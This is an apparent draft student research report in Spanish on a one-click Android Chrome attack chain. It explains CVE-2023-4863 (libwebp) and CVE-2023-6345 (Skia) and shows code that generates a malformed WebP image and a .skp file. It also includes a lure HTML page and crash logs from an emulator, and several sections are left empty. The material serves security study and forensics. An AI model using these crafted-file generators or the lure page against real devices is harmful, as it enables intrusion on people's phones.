# Proyecto de Aplicación Profesional en SOCIALTIC
![img_2.png](imgs/img_2.png)

Autor: Santiago I. López

Contacto: ismael.lopez@iteso.mx

Mayo x, 2026

Supervisor: Paúl Aguilar

# INTRODUCCIÓN



# CADENA DE ATAQUE PROPUESTA

El flujo de ataque trata de uno  tipo “1 clic”, es decir, que sí requiere interacción con la víctima, pero es mínima. 
La cadena empieza con la víctima recibiendo un enlace a través de diversos medios de comunicación, esta incluye los 
servicios de mensajería, redes sociales, correo electrónico, etc. El mensaje tiene un contenido que asegura que la 
persona entre al vínculo, que lo lleva a una página web maliciosa. El ambiente donde se desarrollaron las pruebas 
de concepto fue en Android Studio. Se utilizó una imagen de Android Open Source Project debido a que las versiones que 
incluían Google Play ya venían con los parches de seguridad.


## Primer Paso - CVE-2023-4863 "LibWebP Buffer Overflow"

CVE-2023-4863 Es una vulnerabilidad de tipo Heap Buffer Overflow para la librería de LibWebP. Ocurre durante el
renderizado de imagenes en Chrome. Sus efectos principales incluyen la corrupción de memoria en el área y un RCE
limitado al sandbox.

### Secuencia de Explotación

El formato WebP sin pérdida (VP8L) utiliza la codificación Huffman para reducir el tamaño de los archivos. Para que el 
proceso de decodificación sea eficiente en dispositivos móviles, la librería libwebp previó a 1.3.2 empleaba tablas de 
búsquedas calculadas previamente en la memoria en vez de utilizar estructuras de árbol binarios tradicionales. Estas 
tablas ya calculadas permiten traducir rápidamente los bits de entrada en los símbolos correspondientes.

El fallo se encuentra en la función BuildHuffmanTable del decodificador VP8L. Esta función es encargada de validar los 
códigos Huffman y organizar la estructura de la tabla de búsqueda en la memoria asignada. Libwebp utiliza un array de 
tamaños previamente calculados llamado kTableSize para determinar cuánta memoria asignar en el heap para las tablas ya 
calculadas. Este array solo tiene en cuenta los tamaños para búsquedas de primer nivel de 8 bits, ignorando las tablas 
de segundo nivel necesarias para códigos más largos. Aunque libwebp permite códigos de hasta 15 bits, el búfer 
preasignado no contempla el espacio adicional para estos desbordamientos de nivel.

Ahora bien, el ataque viene por medio de un árbol Huffman extremadamente desequilibrado. El proceso es el siguiente:

Los datos de la imagen se organizan en cinco “segmentos de alfabeto”, que son las características de los colores: verde, 
rojo, azul, alpha y distancia, cada uno con su propia tabla de búsqueda. Al manipular el tamaño de los códigos en estos 
segmentos, el atacante logra agotar la memoria del heap. Durante el procesamiento del último alfabeto (distancia), la 
función “ReplicateValue”, intenta realizar un OOB write del búfer de huffman_tables. Por último, lo que queda es tomar 
control de los pointers para lograr un RCE.
Esta vulnerabilidad afecta a todas las versiones de Android desde la 11 hasta la 14 previo al parche de seguridad del 6 
de octubre de 2023. Las versiones de Chrome vulnerable son previas a la versión 116.0.5845.187.

### Prueba de Concepto

#### Codigo para Generar la Imagen

Para probar el PoC, se utilizó el código de [DarkNavy “gen_oob_webp.py”](https://github.com/DarkNavySecurity/PoC/blob/main/CVE-2023-4863/gen_oob_webp.py). Este código genera manualmente un archivo .webp 
construyendo cada parte de la imagen bit por bit. El resultado final es un archivo de nombre “oob.webp”, diseñado para 
provocar un error en el proceso de decodificación en WebP, específicamente un out-of-bounds (oob) write en el heap.
A grandes rasgos, el código se puede dividir en cinco bloques

#### Construcción de Bitstreams
El formato VP8L lossless almacena varios valores bit a bit, usando un orden de bits invertido (LSB-first).
El siguiente segmento de código define el método para construir los datos con estos requerimientos:

```python
def bit(val, len=-1):
    if len == -1:
        return bin(val)[2:][::-1]
    else:
        return bin(val)[2:].zfill(len)[::-1]
```
Esta función convierte un numero a binario, lo rellena a una longitud especifica e invierte el orden de los bits.
Luego, en otra función, los bits se convierten en bytes:

```python
def bitstream_to_bytearray(bitstream: str) -> bytearray:
    # Pad the bitstream to make its length a multiple of 8
    while len(bitstream) % 8 != 0:
        bitstream += "0"

    # Convert bitstream to bytearray
    byte_array = bytearray()
    for i in range(0, len(bitstream), 8):
        byte_chunk = bitstream[i : i + 8][::-1]
        byte_value = int(byte_chunk, 2)
        byte_array.append(byte_value)

    return byte_array
```
Ambas permiten construir el flujo de bits de la imagen WebP.

#### Construcción del Contenedor WebP
El archivo WebP se basa en el contenedor _RIFF_. El código crea este encabezado manualmente en la siguiente sección:
```python
RIFF_header = b"RIFF"
RIFF_header += pack("I", webp_chunk_size)
RIFF_header += b"WEBPVP8L"
RIFF_header += pack("I", lossless_stream_size)
```
Esto produce un archivo con la estructura válida y reconocible por los sistemas

#### Construcción de Tablas de Compresión

Como descrito en la explicación teórica, el formato VP8L usa codificación Huffman para comprimir los datos de imagen. 
El script construye manualmente las longitudes de estos códigos, ejemplo del código:
```python
code_length_green = bit(0)
code_length_green += (
    "0000" * 1
    + "1000" * 235
    + "1001" * 37
    + "1010"
    + "1011"
    + "1100"
    + "1101" * 64
    + "1110" * 4
)
code_length_red = bit(0)
code_length_red += (
    "0000"
    + "0001"
    + "1000" * 67
    + "1001" * 117
    + "1010"
    + "1011"
    + "1100"
    + "1101" * 65
    + "1110" * 2
)
code_length_dist = bit(0)
```
#### Inserción de la Secuencia que Provoca la Corrupción de Memoria

La función encargada de esto es:
```python
def overwrite(offset, value=0x27)
```
Ésta construye una secuencia de bits diseñada para que el decodificador interprete incorrectamente las tablas de Huffman
calcule offsets erróneos y termine escribiendo datos fuera del heap. El resultado se inserta en el flujo comprimido en 
la siguiente línea:
```python
code_length_dist += overwrite(0, 3)
```

#### Ensamblado Final del Archivo
Finalmente, el código combina todos los componentes y escribe el archivo final *"oob.webp"*
```python
image = bytearray()
image.extend(RIFF_header)
image.extend(image_header)
image.extend(image_stream)

webp_chunk_size = len(image) - 8
lossless_stream_size = webp_chunk_size - 13

# edit image's size
image[4:8] = pack("I", webp_chunk_size)
image[16:20] = pack("I", lossless_stream_size)

print(image)
with open("oob.webp", "wb") as f:
    f.write(image)
```

#### Modificación al PoC
Se agregó una función en el código para generar una imagen que sí causara el crash dentro del navegador del dispositivo 
emulado. Originalmente tiene un tamaño lógico de 1x1 bits

![img.png](imgs/img.png)

Fue posible aumentar el tamaño lógico de la imagen modificando el header de VPL8. Originalmente, esto ocurre en la 
siguiente porción de código:

```python
image_header = b"\x2f"
image_header += bitstream_to_bytearray("0" * 28 + "1000")
```
Éste incluye el ancho (width), largo (height), Alpha flag, y la versión.
Sin embargo, esto es reemplazado parcialmente por una nueva función “_nuevo_header()_”
```python
def nuevo_header(width, height):
    width_bits = bit(width - 1, 14)
    height_bits = bit(height - 1, 14)
    alpha = bit(0, 1)
    version = bit(0, 3)

    bitstream = width_bits + height_bits + alpha + version
    return b"\x2f" + bitstream_to_bytearray(bitstream)
```
El formato no guarda directamente el ancho y alto, sino el valor menos uno, usando 14 bits para cada dimensión. El 
método bit(, 14) convierte el valor en 14 bits invertidos (LSB-first), que es el orden usado por VP8L. Después se añaden
los campos de Alpha y versión para completar los requerimientos. Al final, todos los campos se concatenan para formar 
el encabezado. El orden es importante ya que sigue la estructura definida para el formato:

| Campo            | Tamaño  |
|------------------|---------|
| Width-1 [ANCHO]  | 14 bits |
| Height-1 [LARGO] | 14 bits |
| ALPHA            | 1 bit   |
| VERSION          | 3 bits  |

#### Ejecución del PoC
Se creó el siguiente HTML para demostrar el crasheo:
```html
<html>
<body>

<h2>NOTICIA DE ULTIMO MOMENTO</h2>

<script>
    for (let i = 0; i < 2; i++) {
        let img = document.createElement("img");
        img.src = "big_bad.webp?cache=" + Math.random();
        document.body.appendChild(img); }
    window.location.href = 'exptest.html';
</script>

</body>
</html>
```
Después, se creó el servidor básico de HTTP utilizando el comando de python:
```bash
python3 -m http.server 8000
```

Desde el Android Studio, se accede al Chrome vulnerable previamente instalado. Se accede a la IP de la máquina virtual 
al puerto 8000 y se accede al archivo HTML. Al principio no sucede algo, sin embargo, al recargar la página se ve lo 
siguiente:

![img.png](imgs/img_3.png)

Y al revisar logcat, se encuentra lo siguiente el crash con la señal SIGSEGV código 1 (SEGV_MAPERR), además de 
confirmación de que el proceso del sandbox de Chrome murió

![img.png](imgs/img_4.png)
![img.png](img_5.png)

Al mostrar que el sandbox process murió, se confirma el correcto funcionamiento parcial del PoC de CVE-2023-4863.

## Segundo Paso - CVE-2023-6345 “SKIA INTEGER OVERFLOW”

CVE-2023-6345 es una vulnerabilidad crítica que afectó el motor gráfico de SKIA en Google Chrome, impactando 
principalmente a dispositivos Android y otros sistemas basados en Chromium.

Esta vulnerabilidad es un desbordamiento de enteros que puede permitir un escape del sandbox y suele ser parte de 
una cadena. Primero, el atacante compromete el proceso de renderizado, y luego usa esta vulnerabilidad para saltar al 
siguiente paso

### Secuencia de Explotación

El proceso comienza cuando la librería intenta dibujar una imagen que contiene múltiples operaciones 
“DRAW_VERTICES_OBJECT”. Estas operaciones se utilizan para renderizar gráficos complejos mediante “mallas” de vértices.

Para ser más eficiente, SKIA utiliza otra función llamada “_MeshOp::onCombineIfPossible_”. Su trabajo es combinar la 
operación de la malla actual con las siguientes para procesarlas juntas. Durante el proceso, la función suma los 
recuentos de vértices e índices con las variables _fVertexCount_ y _fIndexCount_ respectivamente, de ambas operaciones.

El error viene en que _fVertexCount_ está definido como un entero de 32 bits. La función _onCombineIfPossible_ suma los 
valores de las mallas sin verificar si el resultado supera el límite que un entero de 32 bits puede almacenar. Cuando la 
suma excede, ocurre un _wrap-around_, resultando en un número más pequeño que el que debería ser.

Después, en una siguiente operación “_MeshOp::onPrepareDraws_”, el sistema reserva un búfer de memoria 
(un “_skgpu::VertexWriter_”) basado en el número erróneo de la función anterior. En este punto, el espacio de memoria 
reservado es insuficiente para contener todos los datos.

Finalmente, el sistema procede a escribir los vértices de cada malla individual en el búfer asignado. Como el búfer es 
de espacio insuficiente, los datos empiezan a escribir fuera de los límites, invadiendo el heap. En una ejecución normal 
de seguridad, el proceso se detendría, pero en las versiones comerciales de Chrome se eliminan por rendimiento. El 
atacante puede manipular este desbordamiento para sobreescribir objetos en la memoria, efectivamente ejecutando código 
fuera del sandbox.

Desafortunadamente, no se encontraron PoCs funcionales para emuladores móviles que involucren CVE-2023-6345. El más 
cercano proviene de 
[Google Project 0](https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2023/CVE-2023-6345.html), pero 
utiliza la librería directamente para demostrarlo en lugar de una prueba recreable en dispositivos.

### Prueba de Concepto

Primero, se compila SKIA con ASAN, para que los mensajes vengan con más contexto. Después, se genera un script para 
crear una imagen .skp. Un archivo .skp es una grabación de comandos de dibujo. En lugar de guardar una imagen como tal,
guarda instrucciones para crear dicha imagen; cuando Chrome lo abre, reproduce estas instrucciones.

El código proporcionado por el artículo genera manualmente un .skp válido, pero con datos específicos para forzar a SKIA
 a calcular mal el tamaño de memoria necesario. El script consta de diferentes secciones:
- Header
- Factory
- Buffers (Paint & Vertices)
- Reader
- EOF

#### Header

El header hace que el archivo se haga válido para SKIA

```bash
info = b'skiapict'
info += p32(kSkBlenderInSkPaint)
info += f32(0)  # left
info += f32(0)  # top
info += f32(30) # right
info += f32(30) # bottom
```

Este define el tipo de archivo, la versión y las dimensiones del canvas

#### Factory

Esta parte define objetos qye sib necesarios para cumplir con el formato:

```bash
factory = tag('fact')
factory += p32(1)
factory += p32(1)
factory += p8(len(name)) 
factory += name
```

#### Paint Buffer

Configura las propiedades del dibujo

#### Vertices Buffer

Es en este apartado donde comienza la preparación del exploit. El archivo define una gran cantidad de vertices:
```bash
vertexCount = 1 << 16  # ¡65536 vertices!
```
Esto tiene diversos efectos, como aumentar el tamaño de los datos a procesar y amplifica cualquier otro cálculo que se 
base en este valor.

#### Reader
Esta es la sección que hace _trigger_ a la vulnerabilidad. En ella se tienen instrucciones de dibujo repetidas.
```bash
reader_ops = reader_op * (INT32_MAX // vertexCount + 1)
```
El +1 es el que termina provocando el overflow.

El fallo ocurre al SKIA calcularo cuánta memoria debería usar:
```bash
total_size = op_count * vertexCount;
```
Ambos valores son enormes, lo que produce el overflow de entero, el resultado se envuelve y se obtiene un número
incorrectamente pequeño

Al tener la librería con ASAN compilada y el archivo .skp, se procede a parsear la imagen SKIA:

```bash
$ ./skia/out/asan/skpbench --src poc.skp --config gles
```

Lo que regresa el siguiente resultado:
```bash
   accum    median       max       min   stddev  samples  sample_ms  clock  metric  config    bench  
../../src/gpu/ganesh/ops/DrawMeshOp.cpp:1225:18: runtime error: signed integer overflow: 2146435072 + 1048576 cannot be represented in type 'int'  
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior ../../src/gpu/ganesh/ops/DrawMeshOp.cpp:1225:18 in
```

## Tercer Paso - CVE -

# Análisis Forense

# Recomendaciones

# Conclusiones

# Referencias
